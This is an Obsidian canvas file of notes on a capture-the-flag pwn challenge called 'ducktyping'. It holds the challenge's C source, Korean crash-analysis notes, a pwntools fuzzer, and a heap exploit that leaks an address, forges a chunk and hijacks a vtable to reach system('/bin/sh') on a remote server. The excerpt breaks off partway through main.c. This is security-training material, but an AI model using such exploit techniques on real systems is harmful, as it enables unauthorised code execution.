{
	"nodes":[
		{"id":"0bccd293cbf490b9","type":"group","x":620,"y":-494,"width":6000,"height":1774,"color":"4","label":"보고서_double free or corruption (out)"},
		{"id":"78c630e2dd23b7a3","type":"group","x":-4869,"y":-1000,"width":3914,"height":2696,"color":"5","label":"evo"},
		{"id":"0d1a8d1b1bab5327","type":"group","x":-8045,"y":-1000,"width":2956,"height":2707,"color":"1","label":"non"},
		{"id":"a9141664b623bf8f","type":"group","x":1120,"y":2000,"width":3440,"height":1095,"color":"5","label":"보고서_segmentation fault"},
		{"id":"ede5772628b98ff2","type":"group","x":-4912,"y":2560,"width":812,"height":3200,"label":"main.c"},
		{"id":"5e928c0c1bff9787","type":"group","x":-2159,"y":-921,"width":1187,"height":1790,"label":"evoperson.c"},
		{"id":"8671f2d17262ec8a","type":"group","x":-4846,"y":-918,"width":977,"height":1805,"label":"evoduck.c"},
		{"id":"4e1e076b7447aa3d","type":"group","x":-3869,"y":-918,"width":896,"height":1709,"label":"evoshell.c"},
		{"id":"639a6638a5e1ac87","type":"group","x":-5820,"y":-913,"width":711,"height":1800,"label":"person.c"},
		{"id":"2d633828445970b9","type":"group","x":-2973,"y":-921,"width":814,"height":1379,"label":"evoquackable.c"},
		{"id":"035ea3e0678a1a0c","type":"group","x":-7275,"y":-910,"width":721,"height":1514,"label":"shell.c"},
		{"id":"e6a983b812eed4b8","type":"group","x":-8025,"y":-910,"width":750,"height":1445,"label":"duck.c"},
		{"id":"7e82fc28e072452c","type":"group","x":-6554,"y":-910,"width":734,"height":1120,"label":"quackable.c"},
		{"id":"826a2b71cbfeccd5","type":"group","x":-4794,"y":1022,"width":873,"height":646,"label":"evoduck.h"},
		{"id":"01cdae7f32b164ac","type":"group","x":-3814,"y":1108,"width":787,"height":560,"label":"evoshell.h"},
		{"id":"8abf6f8845da0c81","type":"group","x":-5352,"y":-2080,"width":775,"height":565,"label":"ooc.h"},
		{"id":"a31071b1ab37d14f","type":"group","x":-5794,"y":1044,"width":660,"height":640,"label":"person.h"},
		{"id":"f8e56833c27ae0c6","type":"group","x":-1855,"y":992,"width":580,"height":645,"label":"evoperson.h"},
		{"id":"db12e951c6d4fed7","type":"group","x":-7960,"y":1096,"width":620,"height":591,"label":"duck.h"},
		{"id":"259ccd5df8aa103f","type":"group","x":-2912,"y":616,"width":653,"height":543,"label":"evoquackable.h"},
		{"id":"4bc8e7164fdbe72c","type":"group","x":-6488,"y":720,"width":603,"height":508,"label":"quackable.h"},
		{"id":"a2f836539870d50a","type":"group","x":-7164,"y":1147,"width":500,"height":540,"label":"shell.h"},
		{"id":"2748179a293b330e","type":"group","x":-700,"y":1169,"width":353,"height":391,"label":"int.h"},
		{"id":"f5e4da73c3c86c83","type":"group","x":-4964,"y":-1280,"width":340,"height":175,"label":"ooc.c"},
		{"id":"4ff169fda8499dca","type":"text","text":"```c\n# ifndef _OOC_H_\n# define _OOC_H_\n  \ntypedef *void* (*vfunc_t)();\ntypedef struct object {\n    vfunc_t *vftable;\n} object_t;\n  \n# define ooc_base __ooc_base\n  \n# define define_base(_type) _type ooc_super\n# define base(_object) ((__typeof__(_object->ooc_super)*)(_object))\n  \n# define define_object() define_base(object_t)\n# define object(_object) ((object_t*)(_object))\n# define vfunc(_object, _type, _n) ((__typeof__(&_type))(object(_object)->vftable[_n]))\n  \n# define impl(_name) _name##_impl\n  \nvoid nullvfunc();\n  \n# endif\n```","x":-5332,"y":-2055,"width":735,"height":520},
		{"id":"bcf112357d38d9b9","type":"text","text":"```c\n# include \"ooc.h\"\n  \nvoid nullvfunc() { }\n```\n","x":-4944,"y":-1245,"width":300,"height":120},
		{"id":"b1e3051797887faa","type":"text","text":"로직\n\n우선 quakable에서 모두 총괄\n인자로 duck, person, shell 어느 것을 주냐에 따라 함수 포인터에 들어가는 값이 해당 카테고리에 맞게 들어가짐\n","x":-5860,"y":2580,"width":680,"height":260},
		{"id":"de4585192447ffbf","type":"text","text":"```\n# define define_base(_type) _type ooc_super\n```\n는 define_base(int) 가 되면 int ooc_super 를 한 것이다.","x":-4520,"y":-1839,"width":480,"height":119},
		{"id":"7c775f9f8734f364","type":"text","text":"2번을 선택할때마다 문자열 최대로","x":-6211,"y":2280,"width":351,"height":65},
		{"id":"33a24b48540cd1b8","type":"text","text":"```c\n# include \"duck/duck.h\"\n  \n# include <stdio.h>\n# include <malloc.h>\n# include <memory.h>\n# include <string.h>\n# include <unistd.h>\n  \n/* ------------------------------------------------------------------------- */\n  \nvoid impl(duck_quack)(duck_t *_this) {\n    printf(\"DUCK: %s\\n\", _this->sound);\n}\n  \nvoid impl(duck_change_sound)(duck_t *_this) {\n    memset(_this->sound, 0, DUCK_SOUND_LEN);\n    printf(\"[+] What do you want to change to?\\n\");\n    printf(\"> \");\n    read(0, _this->sound, DUCK_SOUND_LEN - 1);\n}\n  \nvoid impl(duck_dtor)(duck_t *_this) {\n    impl(quackable_dtor)((quackable_t*)_this);\n}\n  \n/* ------------------------------------------------------------------------- */\n  \n# define N_DTOR         0\n# define N_QUACK        1\n# define N_CHANGE_SOUND 2\n  \nvfunc_t duck_vftable[] = {\n    (vfunc_t)impl(duck_dtor),\n    (vfunc_t)impl(duck_quack),\n    (vfunc_t)impl(duck_change_sound)\n};\n  \nduck_t* duck_create() {\n    duck_t *this = (duck_t*)malloc(sizeof(duck_t));\n    duck_ctor(this);\n    return this;\n}\n  \nduck_t* duck_delete(duck_t *_this) {\n    duck_dtor(_this);\n    free((void*)_this);\n    return (duck_t*)0;\n}\n  \nvoid duck_ctor(duck_t *_this) {\n    quackable_ctor((quackable_t*)_this);\n    object(_this)->vftable = duck_vftable;\n    memset(_this->sound, 0, DUCK_SOUND_LEN);\n    strncpy(_this->sound, DUCK_SOUND_DEF, strlen(DUCK_SOUND_DEF));\n}\n  \nvoid duck_dtor(duck_t *_this) {\n    vfunc(_this, impl(duck_dtor), N_DTOR)(_this);\n}\n  \nvoid duck_quack(duck_t *_this) {\n    vfunc(_this, impl(duck_quack), N_QUACK)(_this);\n}\n  \nvoid duck_change_sound(duck_t *_this) {\n    vfunc(_this, impl(duck_change_sound), N_CHANGE_SOUND)(_this);\n}\n```","x":-8005,"y":-885,"width":710,"height":1400},
		{"id":"b4dcae703a46502b","type":"text","text":"```c\n# include \"duck/quackable.h\"\n  \n# include <malloc.h>\n  \n/* ------------------------------------------------------------------------- */\n  \nvoid impl(quackable_quack)(quackable_t *_this) {\n}\n  \nvoid impl(quackable_change_sound)(quackable_t *_this) {\n  \n}\n  \nvoid impl(quackable_dtor)(quackable_t *_this) {\n  \n}\n  \n/* ------------------------------------------------------------------------- */\n  \n# define N_DTOR         0\n# define N_QUACK        1\n# define N_CHANGE_SOUND 2\n  \nvfunc_t quackable_vftable[] = {\n    (vfunc_t)impl(quackable_dtor),\n    (vfunc_t)impl(quackable_quack),\n    (vfunc_t)impl(quackable_change_sound)\n};\n  \nquackable_t* quackable_delete(quackable_t *_this) {\n    quackable_dtor(_this);\n    free((void*)_this);\n    return (quackable_t*)0;\n}\n  \nvoid quackable_ctor(quackable_t *_this) {\n    object(_this)->vftable = quackable_vftable;\n}\n  \nvoid quackable_dtor(quackable_t *_this) {\n    vfunc(_this, impl(quackable_dtor), N_DTOR)(_this);\n}\n  \nvoid quackable_quack(quackable_t *_this) {\n    vfunc(_this, impl(quackable_quack), N_QUACK)(_this);\n}\n  \nvoid quackable_change_sound(quackable_t *_this) {\n    vfunc(_this, impl(quackable_change_sound), N_CHANGE_SOUND)(_this);\n}\n```","x":-6534,"y":-890,"width":694,"height":1080},
		{"id":"8c038897fd690f7e","type":"text","text":"```c\n# ifndef _SHELL_H_\n# define _SHELL_H_\n\n# include \"duck/quackable.h\"\n\ntypedef struct shell {\n    define_base(quackable_t);\n} shell_t;\n\nvoid shell_quack(shell_t *_this);\nvoid shell_change_sound(shell_t *_this);\nvoid shell_plz_help_me(shell_t *_this);\n\nshell_t* shell_create();\nshell_t* shell_delete(shell_t *_this);\n\nvoid shell_ctor(shell_t *_this);\nvoid shell_dtor(shell_t *_this);\nvoid impl(shell_dtor)(shell_t *_this);\n\n# endif\n```","x":-7144,"y":1167,"width":460,"height":500},
		{"id":"fd54761a835e7b14","type":"text","text":"```c\n# ifndef _QUACKABLE_H_\n# define _QUACKABLE_H_\n  \n# include \"ooc.h\"\n  \ntypedef struct quackable {\n    define_object();\n} quackable_t;\n  \nvoid quackable_quack(quackable_t *_this);\nvoid quackable_change_sound(quackable_t *_this);\n  \nquackable_t* quackable_delete(quackable_t *_this);\n  \nvoid quackable_ctor(quackable_t *_this);\nvoid quackable_dtor(quackable_t *_this);\nvoid impl(quackable_dtor)(quackable_t *_this);\n  \n# endif\n```","x":-6468,"y":740,"width":563,"height":468},
		{"id":"425cd5e18d0838fb","type":"text","text":"```c\n# include \"duck/person.h\"\n\n# include <stdio.h>\n# include <malloc.h>\n# include <memory.h>\n# include <string.h>\n# include <unistd.h>\n\n/* ------------------------------------------------------------------------- */\n\nvoid impl(person_quack)(person_t *_this) {\n    if (strlen(_this->complain) != 0) {\n        printf(\"PERSON: %s\\n\", _this->complain);\n    } else {\n        printf(\"PERSON: %s\\n\", _this->sound);\n    }\n}\n\nvoid impl(person_change_sound)(person_t *_this) {\n    memset(_this->sound, 0, PERSON_SOUND_LEN);\n    printf(\"[+] What do you want to change to?\\n\");\n    printf(\"> \");\n    read(0, _this->sound, PERSON_SOUND_LEN - 1);\n}\n\nvoid impl(person_complain)(person_t *_this) {\n    memset(_this->complain, 0, PERSON_SOUND_LEN);\n    printf(\"[+] %s\\n\", _this->sound);\n    printf(\"[+] I'm not duck! Don't tell me to make duck sound!!\\n\");\n    printf(\"[+] Plz make it normally...\\n\");\n    printf(\"> \");\n    read(0, _this->complain, PERSON_SOUND_LEN - 1);\n}\n\nvoid impl(person_dtor)(person_t *_this) {\n    impl(quackable_dtor)((quackable_t*)_this);\n}\n\n/* ------------------------------------------------------------------------- */\n\n# define N_DTOR         0\n# define N_QUACK        1\n# define N_CHANGE_SOUND 2\n\nvfunc_t person_vftable[] = {\n    (vfunc_t)impl(person_dtor),\n    (vfunc_t)impl(person_quack),\n    (vfunc_t)impl(person_change_sound)\n};\n\nperson_t* person_create() {\n    person_t *this = (person_t*)malloc(sizeof(person_t));\n    person_ctor(this);\n    return this;\n}\n\nperson_t* person_delete(person_t *_this) {\n    person_dtor(_this);\n    free((void*)_this);\n    return (person_t*)0;\n}\n\nvoid person_ctor(person_t *_this) {\n    quackable_ctor((quackable_t*)_this);\n    object(_this)->vftable = person_vftable;\n    memset(_this->sound, 0, PERSON_SOUND_LEN);\n    memset(_this->complain, 0, PERSON_SOUND_LEN);\n    strncpy(_this->sound, PERSON_SOUND_DEF, strlen(PERSON_SOUND_DEF));\n}\n\nvoid person_dtor(person_t *_this) {\n    vfunc(_this, impl(person_dtor), N_DTOR)(_this);\n}\n\nvoid person_quack(person_t *_this) {\n    vfunc(_this, impl(person_quack), N_QUACK)(_this);\n}\n\nvoid person_change_sound(person_t *_this) {\n    vfunc(_this, impl(person_change_sound), N_CHANGE_SOUND)(_this);\n}\n\nvoid person_complain(person_t *_this) {\n    impl(person_complain)(_this);\n}\n```","x":-5800,"y":-893,"width":671,"height":1760},
		{"id":"298a2e123ef36d98","type":"text","text":"```c\n# ifndef _PERSON_H_\n# define _PERSON_H_\n\n# include \"duck/quackable.h\"\n\n# define PERSON_SOUND_LEN 0x20\n# define PERSON_SOUND_DEF \"Quack Quack\"\n\ntypedef struct person {\n    define_base(quackable_t);\n    char sound[PERSON_SOUND_LEN];\n    char complain[PERSON_SOUND_LEN];\n} person_t;\n\nvoid person_quack(person_t *_this);\nvoid person_change_sound(person_t *_this);\nvoid person_complain(person_t *_this);\n\nperson_t* person_create();\nperson_t* person_delete(person_t *_this);\n\nvoid person_ctor(person_t *_this);\nvoid person_dtor(person_t *_this);\nvoid impl(person_dtor)(person_t *_this);\n\n# endif\n```","x":-5774,"y":1064,"width":620,"height":600},
		{"id":"4ef04b5c9b9d26ca","type":"text","text":"```c\n# include \"duck/shell.h\"\n  \n# include <stdio.h>\n# include <stdlib.h>\n# include <malloc.h>\n# include <memory.h>\n# include <string.h>\n# include <unistd.h>\n  \n/* ------------------------------------------------------------------------- */\n  \nvoid impl(shell_quack)(shell_t *_this) {\n    printf(\"SHELL: Q.U.A.C.K. Q.U.A.C.K.\\n\");\n}\n  \nvoid impl(shell_change_sound)(shell_t *_this) {\n    printf(\"[+] I can only make \\\"Q.U.A.C.K. Q.U.A.C.K.\\\" sound\\n\");\n}\n  \nvoid impl(shell_dtor)(shell_t *_this) {\n    impl(quackable_dtor)((quackable_t*)_this);\n}\n  \n/* ------------------------------------------------------------------------- */\n  \n# define N_DTOR         0\n# define N_QUACK        1\n# define N_CHANGE_SOUND 2\n  \nvfunc_t shell_vftable[] = {\n    (vfunc_t)impl(shell_dtor),\n    (vfunc_t)impl(shell_quack),\n    (vfunc_t)impl(shell_change_sound)\n};\n  \nshell_t* shell_create() {\n    shell_t *this = (shell_t*)malloc(sizeof(shell_t));\n    shell_ctor(this);\n    return this;\n}\n  \nshell_t* shell_delete(shell_t *_this) {\n    shell_dtor(_this);\n    free((void*)_this);\n    return (shell_t*)0;\n}\n  \nvoid shell_ctor(shell_t *_this) {\n    quackable_ctor((quackable_t*)_this);\n    object(_this)->vftable = shell_vftable;\n}\n  \nvoid shell_dtor(shell_t *_this) {\n    vfunc(_this, impl(shell_dtor), N_DTOR)(_this);\n}\n  \nvoid shell_quack(shell_t *_this) {\n    vfunc(_this, impl(shell_quack), N_QUACK)(_this);\n}\n  \nvoid shell_change_sound(shell_t *_this) {\n    vfunc(_this, impl(shell_change_sound), N_CHANGE_SOUND)(_this);\n}\n  \nvoid shell_plz_help_me(shell_t *_this) {\n    printf(\"[*] My master just does strange things to me...\\n\");\n    printf(\"[*] I hate to do this!\\n\");\n    printf(\"[*] Come here and help me!!\\n\");\n    system(\"/bin/sh\");\n}\n```","x":-7255,"y":-890,"width":681,"height":1474},
		{"id":"6aa9080ba7a1730b","type":"text","text":"```c\n# ifndef _DUCK_H_\n# define _DUCK_H_\n  \n# include \"duck/quackable.h\"\n  \n# define DUCK_SOUND_LEN 0x20\n# define DUCK_SOUND_DEF \"Quack Quack\"\n  \ntypedef struct duck {\n    define_base(quackable_t);\n    char sound[DUCK_SOUND_LEN];\n} duck_t;\n  \nvoid duck_quack(duck_t *_this);\nvoid duck_change_sound(duck_t *_this);\n  \nduck_t* duck_create();\nduck_t* duck_delete(duck_t *_this);\n  \nvoid duck_ctor(duck_t *_this);\nvoid duck_dtor(duck_t *_this);\nvoid impl(duck_dtor)(duck_t *_this);\n  \n# endif\n```","x":-7940,"y":1116,"width":580,"height":551},
		{"id":"9d120f1e58beb921","type":"text","text":"![](https://i.imgur.com/FmcMcWM.png)","x":-1440,"y":3751,"width":1514,"height":429},
		{"id":"dd66b7336ed9bb7e","type":"text","text":"# person으로 고정 : person에 문제가 있는 것 같음","x":-1440,"y":4180,"width":660,"height":60},
		{"id":"125accc5fd96038b","type":"text","text":"```python\nfrom pwn import *\nimport random\n\ncontext.log_level = 'debug'\n\nr_list = [b'1',b'2',b'3']\np_list = [b'1',b'2',b'3',b'19']\nnum_list = []\n\np = process(\"./ducktyping\")\n\nevop = 0\n\nwhile(True):\n\n    try:\n#        num1 = random.choice(r_list)\n        num1 = b'2'\n        num_list.append(num1)\n        p.sendlineafter(b\">\", num1)\n\n\n        if(num1 == b'2'):\n            num2 = random.choice(p_list)\n            if (num2 == b'3'):\n                evop = 1\n            elif(num2 == b'1' or num2 == b'2'):\n                evop = 0\n            else:\n                pass\n        else :        \n            num2 = random.choice(r_list)\n\n            \n        num_list.append(num2)\n        p.sendlineafter(b\">\", num2)\n\n        if(num1 != b'3' and num2 == b'2'):\n            st = b'a'*0x1f\n            p.sendlineafter(b\">\", st)\n        \n        if(evop != 1 and num2 == b'19'):\n            pst = b'p'*0x1f\n            p.sendlineafter(b\">\", pst)\n    except:\n        break        \n\nprint(num_list)\n```","x":-1440,"y":4240,"width":722,"height":1011},
		{"id":"0f273ad1ac8769f9","type":"text","text":"![](https://i.imgur.com/dVxVwfW.png)","x":-2051,"y":5251,"width":1944,"height":354},
		{"id":"03c9d440bd0581fd","type":"text","text":"```c\n# ifndef _EVOQUACKABLE_H_\n# define _EVOQUACKABLE_H_\n  \n# include \"duck/quackable.h\"\n  \ntypedef struct evoquackable {\n    define_base(quackable_t);\n    quackable_t *original;\n} evoquackable_t;\n  \nvoid evoquackable_quack(evoquackable_t *_this);\nvoid evoquackable_change_sound(evoquackable_t *_this);\nquackable_t *evoquackable_get_original(evoquackable_t *_this);\n  \nevoquackable_t* evoquackable_delete(evoquackable_t *_this);\n  \nvoid evoquackable_ctor(evoquackable_t *_this, quackable_t *_original);\nvoid evoquackable_dtor(evoquackable_t *_this);\nvoid impl(evoquackable_dtor)(evoquackable_t *_this);\n  \n# endif\n```","x":-2892,"y":636,"width":613,"height":503},
		{"id":"af95e1f07adb71eb","type":"text","text":"![](https://i.imgur.com/4P8GWba.png)","x":-2520,"y":2916,"width":1961,"height":128},
		{"id":"d179e8881dcdf579","type":"text","text":"```c\n# ifndef _EVOPERSON_H_\n# define _EVOPERSON_H_\n  \n# include \"duck/evoquackable.h\"\n# include \"duck/person.h\"\n  \n# define EVOPERSON_SOUND_LEN 0x20\n# define EVOPERSON_SOUND_DEF \"Qu4ck Qu4ck\"\n  \ntypedef struct evoperson {\n    define_base(evoquackable_t);\n    char sound[EVOPERSON_SOUND_LEN];\n} evoperson_t;\n  \nvoid evoperson_quack(evoperson_t *_this);\nvoid evoperson_change_sound(evoperson_t *_this);\nperson_t *evoperson_get_original(evoperson_t *_this);\n  \nevoperson_t* evoperson_create(person_t *_original);\nevoperson_t* evoperson_delete(evoperson_t *_this);\n  \nvoid evoperson_ctor(evoperson_t *_this, person_t *_original);\nvoid evoperson_dtor(evoperson_t *_this);\nvoid impl(evoperson_dtor)(evoperson_t *_this);\n  \n# endif\n```","x":-1835,"y":1012,"width":540,"height":605},
		{"id":"44fb11d8222821ba","type":"text","text":"```c\n# include \"duck/evoquackable.h\"\n  \n# include <malloc.h>\n  \n/* ------------------------------------------------------------------------- */\n  \nvoid impl(evoquackable_quack)(evoquackable_t *_this) {\n}\n  \nvoid impl(evoquackable_change_sound)(evoquackable_t *_this) {\n  \n}\n  \nquackable_t* impl(evoquackable_get_original)(evoquackable_t *_this) {\n    return _this->original;\n}\n  \nvoid impl(evoquackable_dtor)(evoquackable_t *_this) {\n    impl(quackable_dtor)((quackable_t*)_this);\n}\n  \n/* ------------------------------------------------------------------------- */\n  \n# define N_DTOR              0\n# define N_QUACK             1\n# define N_CHANGE_SOUND      2\n# define N_GET_ORIGINAL      3\n  \nvfunc_t evoquackable_vftable[] = {\n    (vfunc_t)impl(evoquackable_dtor),\n    (vfunc_t)impl(evoquackable_quack),\n    (vfunc_t)impl(evoquackable_change_sound),\n    (vfunc_t)impl(evoquackable_get_original),\n};\n  \nevoquackable_t* evoquackable_delete(evoquackable_t *_this) {\n    evoquackable_dtor(_this); // 의미없는 함수\n    free((void*)_this);\n    return (evoquackable_t*)0;\n}\n  \nvoid evoquackable_ctor(evoquackable_t *_this, quackable_t *_original) {\n    quackable_ctor((quackable_t*)_this); // 할당된 부분에 vftable 주소넣기\n    object(_this)->vftable = evoquackable_vftable; // object의 vftable에 해당 quack 넣기\n    _this->original = _original; // 할당된 부분의 orginal에 original 넣기\n}\n  \nvoid evoquackable_dtor(evoquackable_t *_this) {\n    vfunc(_this, impl(evoquackable_dtor), N_DTOR)(_this);\n}\n  \nvoid evoquackable_quack(evoquackable_t *_this) {\n    vfunc(_this, impl(evoquackable_quack), N_QUACK)(_this);\n}\n  \nvoid evoquackable_change_sound(evoquackable_t *_this) {\n    vfunc(_this, impl(evoquackable_change_sound), N_CHANGE_SOUND)(_this);\n}\n  \nquackable_t* evoquackable_get_original(evoquackable_t *_this) {\n    return vfunc(_this, impl(evoquackable_get_original), N_GET_ORIGINAL)(_this);\n}\n```","x":-2953,"y":-901,"width":774,"height":1339},
		{"id":"b72269ecf6fe212a","type":"text","text":"`[b'3', b'3', b'2', b'2', b'2', b'19', b'2', b'2', b'2', b'3', b'3', b'3', b'3', b'2', b'2', b'3', b'3', b'3', b'2', b'2', b'2', b'2', b'2', b'19', b'3', b'2', b'3']`","x":-1819,"y":2852,"width":1260,"height":64},
		{"id":"ea680c78a5f3d9dd","type":"text","text":"자동 최적화시 제일 짧은 list는 double free or corruption 만 발생, segmentaion fault와 double free or corruption을 구분지어 나오도록 자동 최적화는 못 만들어서 어려번 실행 시킨 끝에 그나마 짧은 list 발견","x":-1189,"y":2752,"width":633,"height":100},
		{"id":"74accab30fd1a463","type":"text","text":"list 에서 1을 뺌","x":-556,"y":2772,"width":250,"height":60},
		{"id":"ce25672318a7eb76","type":"text","text":"최적화","x":-480,"y":2916,"width":250,"height":60},
		{"id":"83d57de905b0a80c","type":"text","text":"```c\n# ifndef _EVODUCK_H_\n# define _EVODUCK_H_\n  \n# include \"duck/evoquackable.h\"\n# include \"duck/duck.h\"\n  \n# define EVODUCK_SOUND_LEN 0x20\n# define EVODUCK_SOUND_DEF \"Qu4ck Qu4ck\"\n  \ntypedef struct evoduck {\n    define_base(evoquackable_t);\n    char sound[EVODUCK_SOUND_LEN];\n} evoduck_t;\n  \nvoid evoduck_quack(evoduck_t *_this);\nvoid evoduck_change_sound(evoduck_t *_this);\nduck_t *evoduck_get_original(evoduck_t *_this);\n  \nevoduck_t* evoduck_create(duck_t *_original);\nevoduck_t* evoduck_delete(evoduck_t *_this);\n  \nvoid evoduck_ctor(evoduck_t *_this, duck_t *_original);\nvoid evoduck_dtor(evoduck_t *_this);\nvoid impl(evoduck_dtor)(evoduck_t *_this);\n  \n# endif\n```","x":-4774,"y":1042,"width":833,"height":595},
		{"id":"10f664efb480cee6","type":"text","text":"```c\n# include \"duck/evoperson.h\"\n  \n# include <stdio.h>\n# include <malloc.h>\n# include <memory.h>\n# include <string.h>\n# include <unistd.h>\n  \n/* ------------------------------------------------------------------------- */\n  \nvoid impl(evoperson_quack)(evoperson_t *_this) {\n    printf(\" /$$$$$$$$ /$$    /$$  /$$$$$$  /$$$$$$$  /$$$$$$$$ /$$$$$$$   /$$$$$$   /$$$$$$  /$$   /$$\\n\");\n    printf(\"| $$_____/| $$   | $$ /$$__  $$| $$__  $$| $$_____/| $$__  $$ /$$__  $$ /$$__  $$| $$$ | $$\\n\");\n    printf(\"| $$      | $$   | $$| $$  \\\\ $$| $$  \\\\ $$| $$      | $$  \\\\ $$| $$  \\\\__/| $$  \\\\ $$| $$$$| $$\\n\");\n    printf(\"| $$$$$   |  $$ / $$/| $$  | $$| $$$$$$$/| $$$$$   | $$$$$$$/|  $$$$$$ | $$  | $$| $$ $$ $$\\n\");\n    printf(\"| $$__/    \\\\  $$ $$/ | $$  | $$| $$____/ | $$__/   | $$__  $$ \\\\____  $$| $$  | $$| $$  $$$$\\n\");\n    printf(\"| $$        \\\\  $$$/  | $$  | $$| $$      | $$      | $$  \\\\ $$ /$$  \\\\ $$| $$  | $$| $$\\\\  $$$\\n\");\n    printf(\"| $$$$$$$$   \\\\  $/   |  $$$$$$/| $$      | $$$$$$$$| $$  | $$|  $$$$$$/|  $$$$$$/| $$ \\\\  $$\\n\");\n    printf(\"|________/    \\\\_/     \\\\______/ |__/      |________/|__/  |__/ \\\\______/  \\\\______/ |__/  \\\\__/\\n\");\n    printf(\"%s\\n\", _this->sound);\n}\n  \nvoid impl(evoperson_change_sound)(evoperson_t *_this) {\n    memset(_this->sound, 0, EVOPERSON_SOUND_LEN);\n    printf(\"[+] What do you want to change to?\\n\");\n    printf(\"> \");\n    read(0, _this->sound, EVOPERSON_SOUND_LEN - 1);\n}\n  \nperson_t* impl(evoperson_get_original)(evoperson_t *_this) {\n    return (person_t*)base(_this)->original;\n}\n  \nvoid impl(evoperson_dtor)(evoperson_t *_this) {\n    impl(evoquackable_dtor)((evoquackable_t*)_this);\n}\n  \n/* ------------------------------------------------------------------------- */\n  \n# define N_DTOR              0\n# define N_QUACK             1\n# define N_CHANGE_SOUND      2\n# define N_GET_ORIGINAL      3\n  \nvfunc_t evoperson_vftable[] = {\n    (vfunc_t)impl(evoperson_dtor),\n    (vfunc_t)impl(evoperson_quack),\n    (vfunc_t)impl(evoperson_change_sound),\n    (vfunc_t)impl(evoperson_get_original),\n};\n  \nevoperson_t* evoperson_create(person_t *_original) {\n    evoperson_t *this = (evoperson_t*)malloc(sizeof(evoperson_t));\n    evoperson_ctor(this, _original);\n    return this;\n}\n  \nevoperson_t* evoperson_delete(evoperson_t *_this) { // 안쓰이는 함수\n    evoperson_dtor(_this);\n    free((void*)_this);\n    return (evoperson_t*)0;\n}\n  \nvoid evoperson_ctor(evoperson_t *_this, person_t *_original) {\n    evoquackable_ctor((evoquackable_t*)_this, (quackable_t*)_original);\n    object(_this)->vftable = evoperson_vftable;\n    memset(_this->sound, 0, EVOPERSON_SOUND_LEN);\n    strncpy(_this->sound, EVOPERSON_SOUND_DEF, strlen(EVOPERSON_SOUND_DEF));\n}\n  \nvoid evoperson_dtor(evoperson_t *_this) {\n    vfunc(_this, impl(evoperson_dtor), N_DTOR)(_this);\n}\n  \nvoid evoperson_quack(evoperson_t *_this) {\n    vfunc(_this, impl(evoperson_quack), N_QUACK)(_this);\n}\n  \nvoid evoperson_change_sound(evoperson_t *_this) {\n    vfunc(_this, impl(evoperson_change_sound), N_CHANGE_SOUND)(_this);\n}\n  \nperson_t* evoperson_get_original(evoperson_t *_this) {\n    return vfunc(_this, impl(evoperson_get_original), N_GET_ORIGINAL)(_this);\n}\n```","x":-2139,"y":-901,"width":1147,"height":1750},
		{"id":"b5304f33d242b9f7","type":"text","text":"## person의 구조체\n\nvftable : 8bte\n울음소리 : 0x20byte\n컴플레인 : 0x20byte","x":-880,"y":-320,"width":400,"height":294},
		{"id":"5b57fb7de5f3ec1f","type":"text","text":"# SHELL의 구조체\n\nvftable : 8byte","x":-400,"y":160,"width":400,"height":294},
		{"id":"f08040a2988a8be8","type":"text","text":"# exploit\n```python\nfrom pwn import *\n\ncontext.log_level = 'debug'\n\n# p = process(\"./ducktyping\")\np = remote(\"211.229.218.12\", 33019)\n\npause()\n\np.sendlineafter(b\">\", b'2')\np.sendlineafter(b\">\", b'3')\n\np.sendlineafter(b\">\", b'3')\np.sendlineafter(b\">\", b'3')\n\n\np.sendlineafter(b\">\", b'2')\np.sendlineafter(b\">\", b'3')\n\np.sendlineafter(b\">\", b'2')\np.sendlineafter(b\">\", b'1')\n\np.sendlineafter(b\">\", b'2')\np.sendlineafter(b\">\", b'19')\n\np.recvuntil(b\"[+] \")\nleak_heap = u64(p.recv(4)+b\"\\x00\\x00\\x00\\x00\")\nex_chunk = leak_heap + 0x78\n# print(leak)\nshell_add = 0x0000000000401e15 \n\nleak = b'a' *0x8\nleak += p64(0)\nleak += p64(0x21)\nleak += p32(ex_chunk)\np.sendafter(b\">\", leak)\n# 0x01d8a2d0\\\np.sendlineafter(b\">\", b'2')\np.sendlineafter(b\">\", b'2')\nex = b''\nex += p64(shell_add)\np.sendlineafter(b\">\",ex)\n\np.sendlineafter(b\">\", b'3')\np.sendlineafter(b\">\", b'1')\n\n\np.interactive()\n```","x":-2987,"y":-2140,"width":427,"height":1120},
		{"id":"1c864243bec3e2b6","type":"text","text":"```c\n# include <stdio.h>\n  \n# include <stdio.h>\n# include <stdbool.h>\n  \n# include \"int.h\"\n  \n# include \"duck/quackable.h\"\n# include \"duck/evoquackable.h\"\n# include \"duck/duck.h\"\n# include \"duck/evoduck.h\"\n# include \"duck/person.h\"\n# include \"duck/evoperson.h\"\n# include \"duck/shell.h\"\n# include \"duck/evoshell.h\"\n  \ntypedef s64_t evolution_t;\nevolution_t evolutions[3] = { 0 };\nquackable_t *quackables[3] = { NULL };\n  \nvoid setup_environment() {\n    setvbuf(stdin, NULL, _IONBF, 0);\n    setvbuf(stdout, NULL, _IONBF, 0);\n}\n  \ns64_t select_duck(evolution_t *_evolutions) {\n    s64_t selection = 0;\n    printf(\"[DUCK TYPE]\\n\");\n    printf(\n        \"1. %s\\n\",\n        _evolutions[0] == 0\n            ? \"DUCK\"\n            : \"EVODUCK\");\n    printf(\n        \"2. %s\\n\",\n        _evolutions[1] == 0\n            ? \"PERSON\"\n            : \"EVOPERSON\");\n    printf(\n        \"3. %s\\n\",\n        _evolutions[2] == 0\n            ? \"SHELL\"\n            : \"EVOSHELL\");\n    printf(\"> \");\n    scanf(\"%ld\", &selection);\n    if (selection < 1 || 3 < selection) {\n        selection = 0;\n    }\n    return selection;\n}\n  \ns64_t select_action() {\n    s64_t selection = 0;\n    printf(\"[ACTION]\\n\");\n    printf(\"1. Make sound\\n\");\n    printf(\"2. Change sound\\n\");\n    printf(\"3. Evolution\\n\");\n    printf(\"> \");\n    scanf(\"%ld\", &selection);\n    if (selection != 19 && (selection < 1 || 3 < selection)) {\n        selection = 0;\n    }\n    return selection;\n}\n  \nvoid involution(quackable_t **_quackables, evolution_t *_evolutions, s64_t _duck) {\n    if (_evolutions[_duck] == 0) {\n        return;\n    }\n    evoquackable_t *evoquackable = (evoquackable_t*)_quackables[_duck];\n    quackable_t *quackable = evoquackable_get_original(evoquackable);\n    evoquackable_delete(evoquackable);\n    _quackables[_duck] = quackable;\n    _evolutions[_duck] = 0;\n}\n  \nvoid handle_make_sound(quackable_t **_quackables, evolution_t *_evolutions, s64_t _duck) {\n    quackable_t *quackable = _quackables[_duck];\n    quackable_quack(quackable);\n    involution(_quackables, evolutions, _duck);\n}\n  \nvoid handle_change_sound(quackable_t 